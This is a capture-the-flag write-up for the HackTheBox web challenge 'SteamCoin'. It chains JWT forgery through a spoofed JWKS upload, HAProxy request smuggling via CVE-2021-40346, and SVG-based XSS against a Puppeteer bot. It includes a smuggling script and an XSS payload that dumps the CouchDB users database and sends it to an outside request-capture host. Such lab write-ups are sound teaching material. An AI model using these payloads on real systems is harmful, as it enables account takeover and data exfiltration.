# SteamCoin
**Writeup by: ** arcayn
**Category: ** Web
**Difficulty: ** Medium

We are given the full downloadable for an entire node.js application, including its build files, as well as an IP and port for a live version of the app. We begin analysing the website and see it has three basic functionalities:
	- Create user
	- Login
	- Upload file
Beginning to look through the downloadable, we see all the standard aspects of a node app and a `routes/index.js` which appears to contain the majority of the logic for the server. We still don't have any indication of how to get the flag, so we dig a little deeper and find `databases.js` which has the following code:
```javascript
this.userdb = this.couch.use('users');
 let adminUser = { 
	 username: 'admin',
	 password: crypto.randomBytes(13).toString('hex'),
	 verification_doc: 'HTB{f4k3_fl4g_f0r_t3st1ng}'
 };

 this.userdb.insert(adminUser, adminUser.username)
 	.catch(() => {});
```
So clearly we want to somehow access the `verification_doc` field of the admin user. But how do we go about this? We notice that `views/settings.html` will display the `verification_doc` string of the currently logged in user - but looking in `index.js`, we see:
```js
if ( user.username == 'admin') return res.redirect('/dashboard');
```
In the code for the `settings` view. In fact, most of the application paths will funnel admin users to `/dashboard` which renders the very unhelpful `admin.html` file. However, there is one route which *only* admins can access - `/api/test-ui`. This allows us to submit paths which is then visited by a local instance of Chromium, initialized by the `puppeteer` module. Since there is nothing else really of interest, and SSRF will always be nice, let's see if we can log in as admin

## Gaining admin access
By investigating `AuthMiddleware.js` we see that authentication is done via JSON web tokens. The most important section of code is the following:
```js
if (header.jku.lastIndexOf('http://localhost:1337/', 0) !== 0) {
	 return res.status(500).send(response('The JWKS endpoint is not from localhost!'));
 }
 
 return JWTHelper.getPublicKey(header.jku, header.kid)
 	.then(pubkey => {
		 return JWTHelper.verify(req.cookies.session, pubkey)
			 .then(data => {
				 req.data = {
					username: data.username,
				 }
				 return next();
			 })
			.catch(() => res.status(403).send(response('Authentication token could not be verified!')));
	 })
	 .catch(e => console.log(e))
	 .catch(() => res.redirect('/logout'));
 ```
 The JWT uses `jku` verification, where the token defines the URL which the public key for signature verification is stored at. We can inspect `index.js` to see that when we log in, we will have the key store set to `http://localhost:1337/.well-known/jwks.json` - which is a common location for storing JSON web key files.  All this code does is read the public key file from the url `header.jku` and takes the public key with id `header.kid`, then verifies the signature against it. Now note the first check ensures that we cannot just point the `jku` to a server we control - we have to point it at `localhost`. 
 
 But this isn't a problem! Going back to `routes/index.js` we analyse the `/api/upload` endpoint:
 ```js
 let verificationDoc = req.files.verificationDoc;
 if (!isValidFile(verificationDoc)) return res.status(403).send(response('The file must be an image or pdf!'));
 let filename = `${verificationDoc.md5}.${verificationDoc.name.split('.').slice(-1)[0]}`;
 uploadPath = path.join(__dirname, '/../uploads', filename);
 verificationDoc.mv(uploadPath, (err) => {
 	if (err) return res.status(500).send(response('Something went wrong!'));
 });
 ...
 user.verification_doc = filename;
 ```
 and see that we can upload any image file we want and put it in the uploads directory, and although the filename is obfuscated, it is still returned to us. Thus we can upload files we control to the server, and know what the path to access them is. In the main `index.js` of the entire app, we can see that the `uploads` directory is exposed, so the images are publically accessible. Now we look at
 ```js
const isValidFile = (file) => {
 return [ 'jpg', 'png', 'svg', 'pdf' ]
 	.includes(file.name.split('.').slice(-1)[0])
}
```
and see that all is checked is file extension. Thus we can upload a JSON web key file, call it a `png`, and have it in a place which we can direct out `jku` parameter to point to. This means we can trick the web server into verifying signatures against a public key we can choose (and thus retain knowledge of the private key). We check `/.well-known/jwks.json` to get the expected format, algorithm and kid (`603c2e6b-e629-4bea-b813-e4ccf765cf2`). Now I used [mkjwk](https://mkjwk.org/) to generate a keypair in the format required, and saved the private key as `jwtRSA256-private.pem` and the public key file as `test2.png`.  Now I created a dummy user and uploaded the file, saving the obfuscated filename - in this case: `2a5f5557d89e44c1c09983a51e242ad0.png`. 

Next, I copied the session cookie from my logged-in browser session, using [jwt.io](https://jwt.io/) to view and edit the data. I set
`"jku": "http://localhost:1337/uploads/2a5f5557d89e44c1c09983a51e242ad0.png"` 
in the header to point the verification key to my malicious upload, and then edited 
`"user": "admin"`
in the payload. Next we use the following command:
```
echo -n <jwt data> | openssl dgst -sha256
 -binary -sign jwtRSA256-private.pem  | openssl enc -base64 | tr -d '\n=' | tr -- '+/' '-_'
```
to generate a signature for the jwt, and concatenate this all together to yield a jwt of
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjYwM2MyZTZiLWU2MjktNGJlYS1iODEzLWU0Y2NmNzY1Y2YyNSIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzJhNWY1NTU3ZDg5ZTQ0YzFjMDk5ODNhNTFlMjQyYWQwLnBuZyJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjM3NTA3ODYyfQ.gWm-Jz1fSQ8lucWVvq8arfQ36oz-joDZhJOwisTMQvzPZu7S8VEF7cAO4mseRyeJukWJUojDNES7AsqHPp8E1Ys_K5pIHhwrcpy-w2WGTK3Y1fwLmXNmdeI9Vpi5N5JBYh7ku05N06reBUemCZ7ckG9UMrJ6ZJm4xnHamD076AD6NLxJrzkbICxSukk0ajYXQgY6bQTPlZyZ7Lj3X3ycLmTUuxDhTDwwR9U45pjfBZeY26eqUdGhuzc6pRUeAlQdrVJrtdeMQilIra0RB4jtl8AzTbevXN0MJ6j1WRs3C9MVNdOMbKSmaerdZnbp-KUa5h9dD2GDdn_GiTPEV8ve2w
```
Setting our session cookie to this will have us logged in as admin.

## Bypassing HAProxy
Now we want to hit `/api/test-ui` to continue our exploration, however we hit a problem. We are not allowed to access the endpoint, even when logged in as admin. Some digging around in the downloadable files leads us to `haproxy.cfg`, which contains the lines:
```
frontend http-in
 bind *:80
 default_backend web
 acl network_allowed src 127.0.0.1
 acl restricted_page path_beg /api/test-ui
 http-request deny if restricted_page !network_allowed
```
Clearly, we can see that this is denying access to `/api/test-ui` if we are not originating from localhost. This seems to put a stop to our access attempt, since we are oping to use `/api/test-ui` to achieve SSRF - but it now looks like we'll need it to be able to access the endpoint in the first place! However, some research lead me to [ CVE-2021-40346](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/), a recent vulnerability discovered in HAProxy which allows request smuggling - and the PoC specifically shows it bypassing ACL restrictions! We form a request as described in the PoC:

```
POST /register HTTP/1.1
Host: 178.62.19.68
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 644

POST /api/test-ui HTTP/1.1
Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjYwM2MyZTZiLWU2MjktNGJlYS1iODEzLWU0Y2NmNzY1Y2YyNSIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzJhNWY1NTU3ZDg5ZTQ0YzFjMDk5ODNhNTFlMjQyYWQwLnBuZyJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjM3NTA3ODYyfQ.gWm-Jz1fSQ8lucWVvq8arfQ36oz-joDZhJOwisTMQvzPZu7S8VEF7cAO4mseRyeJukWJUojDNES7AsqHPp8E1Ys_K5pIHhwrcpy-w2WGTK3Y1fwLmXNmdeI9Vpi5N5JBYh7ku05N06reBUemCZ7ckG9UMrJ6ZJm4xnHamD076AD6NLxJrzkbICxSukk0ajYXQgY6bQTPlZyZ7Lj3X3ycLmTUuxDhTDwwR9U45pjfBZeY26eqUdGhuzc6pRUeAlQdrVJrtdeMQilIra0RB4jtl8AzTbevXN0MJ6j1WRs3C9MVNdOMbKSmaerdZnbp-KUa5h9dD2GDdn_GiTPEV8ve2w
DUMMY:GET /register HTTP/1.1
Host: 178.62.19.68
```

And get a response of

```
b'HTTP/1.1 404 Not Found\r\nx-powered-by: Express\r\ncontent-type: application/json; charset=utf-8\r\ncontent-length: 32\r\ndate: Sun, 21 Nov 2021 15:23:43 GMT\r\n\r\n{"message":"404 page not found"}HTTP/1.1 500 Internal Server Error\r\nx-powered-by: Express\r\ncontent-type: text/html; charset=utf-8\r\ncontent-length: 28\r\ndate: Sun, 21 Nov 2021 15:23:43 GMT\r\n\r\nMissing required parameters!'
```
Which is exactly what we want to see - the `Missing required parameters!` at the end indicates that we have hit the endpoint and passed all the authorisation checks - we just now need to pass data to the api.

In order to pass data, we need to send it in the body of a POST request. There is no PoC online for the exploit working with a non-empty POST request body which also returns the data back to the exploiter - only ones which hit the endpoint but we cannot access the data. However, in the end our strategy did not require the data to be returned to us directly from the request, so we do not need to do the three-request strategy shown above, just the simpler two-request strategy described in the first part of the article. We write a helper function in python to send smuggled POST requests:
```python
def tth_p(url,params=None):
	post_content = b'\r\n'
	form_content = json.dumps(params).encode()
	post_content += b"Host: "+host.encode()+b"\r\nContent-Type: application/json\r\nContent-Length: " + str(len(form_content)).encode() + b'\r\n\r\n' + form_content
	second_part = b'\r\n\r\n POST ' + url.encode() + b' HTTP/1.1\r\nCookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjYwM2MyZTZiLWU2MjktNGJlYS1iODEzLWU0Y2NmNzY1Y2YyNSIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzJhNWY1NTU3ZDg5ZTQ0YzFjMDk5ODNhNTFlMjQyYWQwLnBuZyJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjM3NTA3ODYyfQ.gWm-Jz1fSQ8lucWVvq8arfQ36oz-joDZhJOwisTMQvzPZu7S8VEF7cAO4mseRyeJukWJUojDNES7AsqHPp8E1Ys_K5pIHhwrcpy-w2WGTK3Y1fwLmXNmdeI9Vpi5N5JBYh7ku05N06reBUemCZ7ckG9UMrJ6ZJm4xnHamD076AD6NLxJrzkbICxSukk0ajYXQgY6bQTPlZyZ7Lj3X3ycLmTUuxDhTDwwR9U45pjfBZeY26eqUdGhuzc6pRUeAlQdrVJrtdeMQilIra0RB4jtl8AzTbevXN0MJ6j1WRs3C9MVNdOMbKSmaerdZnbp-KUa5h9dD2GDdn_GiTPEV8ve2w' + post_content
	first_part = b'POST /register HTTP/1.1\r\nHost: '+host.encode()+b'\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: '+str(len(second_part) - 2).encode()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(first_part + second_part)
	time.sleep(2)
	print (s.recv(10000))
	s.close()
```
Whilst it looks complex, all this function does is takes a url string and parameters, formats it into an HTTP request, and encapsulates it in the format required for the exploit. Note that we will rever receive any useful data - we have to trust that the post request has in fact been made.

## Exploiting Puppeteer
Now we have access to the puppeteer endpoint, it's time to exploit it. Let's see what it can do:
```js
const testUI = async (path, keyword) => {
	return new Promise(async (resolve, reject) => {
	const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		try {
			await page.goto(`http://127.0.0.1:1337/${path}`, {
				waitUntil: 'networkidle2'
				});
			await page.waitForTimeout(8000);
			await page.evaluate((keyword) => {
				return document.querySelector('body').innerText.includes(keyword)
			}, keyword)
				.then(isMatch => resolve(isMatch));
		} catch(e) {
			reject(false);
		}
		await browser.close();
	});
};
```
We observe that the puppeteer instance is sitting on the network behind the proxy preventing us from accessing the couchDB HTTP API port - `localhost:5984`. Furthermore, the admin password for the database is exposed in plaintext in the downloadable as `youwouldntdownloadacouch`. If we can somehow use puppeteer to hit the database API endpoints, we can dump the database using `/users/_all_docs` (from the CouchDN docs), which will give us the flag as a field on the `admin` user. However, this initially seems very limited - we cant use puppeteer to access the database port, since it forces us to only access the node app. However, if we look back over the list of allowed filetypes, we see that we can upload `svg` files. As described [here](https://research.securitum.com/do-you-allow-to-load-svg-files-you-have-xss/), this immediately allows us to execute an XSS attack against the puppeteer bot, and we can run arbitrary javascript from its privileged context. The following code will dump all the user data from the users database, and send it in a POST request to a [RequestBin](https://requestbin.com/) instance that we registered:
```js
function jj() {
	const Http1 = new XMLHttpRequest();
	Http1.open("GET", "http://admin:youwouldntdownloadacouch@localhost:5984/users/_all_docs?include_docs=true");
	Http1.setRequestHeader('Authorization', 'Basic YWRtaW46eW91d291bGRudGRvd25sb2FkYWNvdWNo');
	Http1.send();
	
	Http1.onreadystatechange = (e) => {
		let Http2 = new XMLHttpRequest();
		Http2.open("POST", "https://enmgux1qyk0ly71.m.pipedream.net", true);
		Http2.setRequestHeader('Content-type', 'application/json');
		Http2.send(Http1.responseText);
	}
}

window.onload = jj
```
Note here that we set an authorization header using basic auth and a token which is simply `admin:youwouldntdownloadacouch` base64 encoded (from the CouchDB docs)
Now we encapsulate this in a valid SVG file (which can contain arbitrary javascript)
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	<script type="text/javascript">
	...
	</script>
</svg>
```
Now we create a new user and upload this file, getting its obfuscated filename as `04ee21c2888d1dae9926d8fd9ccf6268.svg`. When we hit the endpoint, we can send any keyword value we like, since the response doesn't matter, so we run the following code (using the function mentioned in the previous section):
```python
tth_p("/api/test-ui", {"path":"/uploads/04ee21c2888d1dae9926d8fd9ccf6268.svg","keyword":"SouthFlagsington!"})
```

And finally head over to the requestbin, and read the dumped data to obtain the flag as:

`HTB{w3_d0_4_l1ttl3_c0uch_d0wnl04d1ng}`

## Appendix: files mentioned

#### `jwtRSA256-private.pem`
```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDRCXtN3j5x08vT
2pQe7TlkEFnxI1Duu3DmRLsJ1w5gTTycuz8pLW14RtbQNmUj9r3za6dcQsjQSgRf
77RD6owcUPleT5F8ZoAk1oRCVDlaYzD+hEcrB/iVGEngujbgyFQXeh9JnFLt8JFQ
LunT36eAFDxrNXH4/u81sUX8fY66UVboS9TNorc7vfUSxGLYZsqdLOdmJGdzUPNU
ctujGFKdUj3OUA/YoxvIjJQAm/uilM8WszYTBxwq9vvpMAbF3OEA87qLWl9yeiD4
9COhwfloR5WHXnS3vSALEKX90NsLe+UcyKRt4NsgpsC1GelVynjC9fZiNEwI1JtC
t9AMklsDAgMBAAECggEBAMdy946Fpikvf4TFQpz7lc3O+DJnkvomKIPdQmUSJ+pk
55dX5dzhNlkTpjUGIZyd+gG/TvFt23M5nFD5QpOmwEboT/bXjqYWmuALOiibehmv
GPlPtyPsuBdyFFNy+ZeiLPI1mJLAsDPNXKkYCg0ZkhVXuYpFdVixzgX5/h/6oOtN
o2hfHVbVsNqqdxQcv0Z5t8tHxGDC9+OHigFCUB13DqJosYek7wWB2HmGhHO6HnyF
t4D/Bh0GXlnEVkjyKLQgxyCNlqFJ0hPWerzSKNgulFCQlJmuMNCX3c2IbHsk3LSU
oNYFGBMKG+dJ42xAusjpvkZ3jnLG/VLk3DyNG7Jy73kCgYEA/jZR+XJtUu467NRG
sJL/W9n/tWZK4UYFFsE61CXpjgrZAOL/g/gc6nfUaqzTGEcmaAYB9bJuEJdp/lOz
7gOxjCtJuXFh8f+EpGcPoc8Hs3SKN9A1GvdA6B76ZvSyEICOwUBwLOCI1EKjD6JV
hU80dgMVTZME9D3KiYYJ7BaiDw8CgYEA0oHUK0EgMctE4wT1i7WHmhry7mwUnzvt
KnnX2BC7lFwTXz/1q3oB9R7CvYcpZPYe/eRuKcQh7f0bWZYngzzC3l23TgtEYrMf
FlBHazX0nUesuTGz/JtWfatmuKk5z98IDmS1MezpqGGCbQCW3I274yrzslvzP0VO
Etx2oyJu9M0CgYBpdLlO5MQrWf6BzpHAoEpknSux4cyAZV6pEOHJriyUKzXYY1Ki
OWQtdCZfVnB/qsxo7M0VUr7MDTQAOFL1Ev0ta6u6zSlXjatF1Ccs9ch5DohkHPBa
zmVTpb40xZ+0rtAJpSSjyUWZ4EbqrmoR0kiuCBtnQe0VMSj7Ieqt0LnLywKBgC+w
Z9+QtnlxYl7H3dTTwC+iUUzAQX+9dMI9ri9twwEeRuk6NS6uyki8ukNznmYX9/du
y6I8o68luw91m+f4WPFFa+SLWue9SpqkfzmDlLIY7cFayDq++j4oGXJWLBmynkGc
gQwZbunNhV2qV4MJvPn+3gyXFilMSx6swVe90kM1AoGAad1s4pV9fpw0ORyhddzd
u6j8J1aBNnpS+nUZkosCDM2B0DBSmQBoWetC8H8lJnsToxM9KE8HJ/K2lZUDwa2D
tesmtDdetjMIthk0wpxHj590JGyH/2wtqssVdvEaNkqkENEpMBZkz+KZVgOVJEjZ
0wHLU3FOr6d/7jWl0c/ZMk8=
-----END PRIVATE KEY-----
```

#### `test2.png`
```
{
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "603c2e6b-e629-4bea-b813-e4ccf765cf25",
    "alg": "RS256",
    "n": "0Ql7Td4-cdPL09qUHu05ZBBZ8SNQ7rtw5kS7CdcOYE08nLs_KS1teEbW0DZlI_a982unXELI0EoEX--0Q-qMHFD5Xk-RfGaAJNaEQlQ5WmMw_oRHKwf4lRhJ4Lo24MhUF3ofSZxS7fCRUC7p09-ngBQ8azVx-P7vNbFF_H2OulFW6EvUzaK3O731EsRi2GbKnSznZiRnc1DzVHLboxhSnVI9zlAP2KMbyIyUAJv7opTPFrM2EwccKvb76TAGxdzhAPO6i1pfcnog-PQjocH5aEeVh150t70gCxCl_dDbC3vlHMikbeDbIKbAtRnpVcp4wvX2YjRMCNSbQrfQDJJbAw"
}
```